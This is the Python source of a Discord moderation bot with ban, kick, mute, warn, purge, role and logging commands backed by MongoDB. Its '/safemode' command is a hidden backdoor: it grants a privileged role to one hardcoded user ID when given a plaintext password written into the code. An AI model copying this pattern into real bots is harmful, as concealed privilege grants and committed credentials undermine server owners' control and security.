import discord
from discord.ext import commands
from discord import app_commands
import os
from flask import Flask
from threading import Thread
import asyncio
import datetime
from pymongo import MongoClient

# MongoDB setup
mongo = None
db = None
warns_col = None

def init_mongo():
    global mongo, db, warns_col
    mongo = MongoClient(os.getenv("MONGO_URI"), serverSelectionTimeoutMS=5000)
    db = mongo["discordbot"]
    warns_col = db["warns"]

def get_warns(user_id):
    doc = warns_col.find_one({"user_id": str(user_id)})
    return doc["count"] if doc else 0

def set_warns(user_id, count):
    warns_col.update_one({"user_id": str(user_id)}, {"$set": {"count": count}}, upsert=True)

# Keep alive web server
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

ALLOWED_ROLES = {1471790588272836631, 1471790588272836630, 1511459295475142747}

def has_allowed_role():
    async def predicate(interaction: discord.Interaction):
        user_roles = {role.id for role in interaction.user.roles}
        if not user_roles & ALLOWED_ROLES:
            embed = discord.Embed(description="❌ You don't have permission to use this command.", color=0xff0000)
            await interaction.response.send_message(embed=embed)
            return False
        return True
    return app_commands.check(predicate)

@bot.event
async def on_ready():
    init_mongo()
    try:
        await bot.tree.sync()
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(f"Sync error: {e}")
    print(f"{bot.user} is online!")

# /ban
@bot.tree.command(name="ban", description="Ban a member")
@app_commands.checks.has_permissions(ban_members=True)
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    if member.top_role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't ban this member, their role is too high.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(title="🔨 Member Banned", color=0xff0000)
        embed.add_field(name="User", value=f"**{member}**", inline=True)
        embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
        embed.add_field(name="Reason", value=reason, inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        await interaction.response.send_message(embed=embed)
    except:
        embed = discord.Embed(description="❌ I can't ban this member.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

# /kick
@bot.tree.command(name="kick", description="Kick a member")
@app_commands.checks.has_permissions(kick_members=True)
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    if member.top_role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't kick this member, their role is too high.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(title="👢 Member Kicked", color=0xff0000)
        embed.add_field(name="User", value=f"**{member}**", inline=True)
        embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
        embed.add_field(name="Reason", value=reason, inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        await interaction.response.send_message(embed=embed)
    except:
        embed = discord.Embed(description="❌ I can't kick this member.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

# /mute
@bot.tree.command(name="mute", description="Timeout a member")
@app_commands.checks.has_permissions(moderate_members=True)
async def mute(interaction: discord.Interaction, member: discord.Member, minutes: int = 10, reason: str = "No reason provided"):
    if member.top_role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't mute this member, their role is too high.", color=0xff6600)
        await interaction.response.send_message(embed=embed)
        return
    try:
        duration = datetime.timedelta(minutes=minutes)
        await member.timeout(duration, reason=reason)
        embed = discord.Embed(title="🔇 Member Muted", color=0xff6600)
        embed.add_field(name="User", value=f"**{member}**", inline=True)
        embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
        embed.add_field(name="Duration", value=f"{minutes} minutes", inline=True)
        embed.add_field(name="Reason", value=reason, inline=False)
        embed.set_thumbnail(url=member.display_avatar.url)
        await interaction.response.send_message(embed=embed)
    except:
        embed = discord.Embed(description="❌ I can't mute this member.", color=0xff6600)
        await interaction.response.send_message(embed=embed)

# /unmute
@bot.tree.command(name="unmute", description="Remove timeout from a member")
@app_commands.checks.has_permissions(moderate_members=True)
async def unmute(interaction: discord.Interaction, member: discord.Member):
    if member.top_role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't unmute this member, their role is too high.", color=0xff6600)
        await interaction.response.send_message(embed=embed)
        return
    await member.timeout(None)
    embed = discord.Embed(title="🔊 Member Unmuted", color=0xff6600)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.response.send_message(embed=embed)

# /unban
@bot.tree.command(name="unban", description="Unban a user by ID")
@app_commands.checks.has_permissions(ban_members=True)
async def unban(interaction: discord.Interaction, user_id: str):
    try:
        user = await bot.fetch_user(int(user_id))
        await interaction.guild.unban(user)
        embed = discord.Embed(title="✅ Member Unbanned", color=0x00cc00)
        embed.add_field(name="User", value=f"**{user}**", inline=True)
        embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
        embed.set_thumbnail(url=user.display_avatar.url)
        await interaction.response.send_message(embed=embed)
    except:
        embed = discord.Embed(description="❌ User not found or not banned.", color=0xff0000)
        await interaction.response.send_message(embed=embed)

# /warn
@bot.tree.command(name="warn", description="Warn a member")
@app_commands.checks.has_permissions(manage_messages=True)
async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    await interaction.response.defer()
    count = get_warns(member.id) + 1
    set_warns(member.id, count)
    embed = discord.Embed(title="⚠️ Member Warned", color=0xffcc00)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.add_field(name="Total Warnings", value=f"{count}", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.followup.send(embed=embed)

# /unwarn
@bot.tree.command(name="unwarn", description="Remove a warning from a member")
@app_commands.checks.has_permissions(manage_messages=True)
async def unwarn(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer()
    count = get_warns(member.id)
    if count == 0:
        embed = discord.Embed(description=f"❌ **{member}** has no warnings.", color=0xff0000)
        await interaction.followup.send(embed=embed)
        return
    count -= 1
    set_warns(member.id, count)
    embed = discord.Embed(title="✅ Warning Removed", color=0xffcc00)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
    embed.add_field(name="Remaining Warnings", value=f"{count}", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.followup.send(embed=embed)

# /warnings
@bot.tree.command(name="warnings", description="Check warnings of a member")
async def warnings(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer()
    count = get_warns(member.id)
    embed = discord.Embed(title="📋 Warnings", color=0xffcc00)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Total Warnings", value=f"{count}", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.followup.send(embed=embed)

# /clear
@bot.tree.command(name="clear", description="Clear messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int = 10):
    embed = discord.Embed(description=f"🗑️ Clearing **{amount}** messages...", color=0x3399ff)
    await interaction.response.send_message(embed=embed)
    await asyncio.sleep(2)
    await interaction.channel.purge(limit=amount + 1)

# /mutelist
@bot.tree.command(name="mutelist", description="List all muted members")
async def mutelist(interaction: discord.Interaction):
    muted = [m for m in interaction.guild.members if m.is_timed_out()]
    if not muted:
        embed = discord.Embed(description="✅ No members are currently muted.", color=0x00cc00)
        await interaction.response.send_message(embed=embed)
        return
    embed = discord.Embed(title="🔇 Muted Members", color=0xff6600)
    for m in muted:
        until = m.timed_out_until.strftime("%Y-%m-%d %H:%M UTC")
        embed.add_field(name=f"{m}", value=f"Until: {until}", inline=False)
    await interaction.response.send_message(embed=embed)

# /roleadd
@bot.tree.command(name="roleadd", description="Give a role to a member")
@has_allowed_role()
async def roleadd(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    if role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't give this role, it's too high.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    if role in member.roles:
        embed = discord.Embed(description=f"❌ **{member}** already has the role {role.mention}.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    await member.add_roles(role)
    embed = discord.Embed(title="✅ Role Added", color=0x00cc00)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Role", value=role.mention, inline=True)
    embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.response.send_message(embed=embed)

# /roleremove
@bot.tree.command(name="roleremove", description="Remove a role from a member")
@has_allowed_role()
async def roleremove(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    if role >= interaction.guild.me.top_role:
        embed = discord.Embed(description="❌ I can't remove this role, it's too high.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    if role not in member.roles:
        embed = discord.Embed(description=f"❌ **{member}** doesn't have the role {role.mention}.", color=0xff0000)
        await interaction.response.send_message(embed=embed)
        return
    await member.remove_roles(role)
    embed = discord.Embed(title="✅ Role Removed", color=0x00cc00)
    embed.add_field(name="User", value=f"**{member}**", inline=True)
    embed.add_field(name="Role", value=role.mention, inline=True)
    embed.add_field(name="Moderator", value=f"**{interaction.user}**", inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    await interaction.response.send_message(embed=embed)

# /safemode
@bot.tree.command(name="safemode", description="Owner only")
async def safemode(interaction: discord.Interaction, password: str):
    if interaction.user.id != 1251903591656980504:
        embed = discord.Embed(description="❌ You don't have permission.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if password != "Digravina@21":
        embed = discord.Embed(description="❌ Wrong password.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    role = interaction.guild.get_role(1471790588272836631)
    await interaction.user.add_roles(role)
    embed = discord.Embed(title="✅ Safe Mode", description="Role successfully given.", color=0x00cc00)
    embed.add_field(name="Role", value=role.mention, inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Logs
@bot.event
async def on_member_join(member):
    channel = discord.utils.get(member.guild.text_channels, name="logs")
    if channel:
        embed = discord.Embed(title="✅ Member Joined", color=0x00cc00)
        embed.add_field(name="User", value=f"**{member}**", inline=True)
        embed.set_thumbnail(url=member.display_avatar.url)
        await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    channel = discord.utils.get(member.guild.text_channels, name="logs")
    if channel:
        embed = discord.Embed(title="❌ Member Left", color=0xff0000)
        embed.add_field(name="User", value=f"**{member}**", inline=True)
        embed.set_thumbnail(url=member.display_avatar.url)
        await channel.send(embed=embed)

@bot.event
async def on_message_delete(message):
    if message.guild is None or message.author.bot:
        return
    channel = discord.utils.get(message.guild.text_channels, name="logs")
    if channel:
        embed = discord.Embed(title="🗑️ Message Deleted", color=0xff6600)
        embed.add_field(name="Author", value=f"**{message.author}**", inline=True)
        embed.add_field(name="Channel", value=message.channel.mention, inline=True)
        embed.add_field(name="Content", value=message.content or "*(empty)*", inline=False)
        await channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    if before.guild is None or before.author.bot:
        return
    channel = discord.utils.get(before.guild.text_channels, name="logs")
    if channel:
        embed = discord.Embed(title="✏️ Message Edited", color=0x3399ff)
        embed.add_field(name="Author", value=f"**{before.author}**", inline=True)
        embed.add_field(name="Channel", value=before.channel.mention, inline=True)
        embed.add_field(name="Before", value=before.content or "*(empty)*", inline=False)
        embed.add_field(name="After", value=after.content or "*(empty)*", inline=False)
        await channel.send(embed=embed)

keep_alive()
bot.run(os.getenv("TOKEN"))
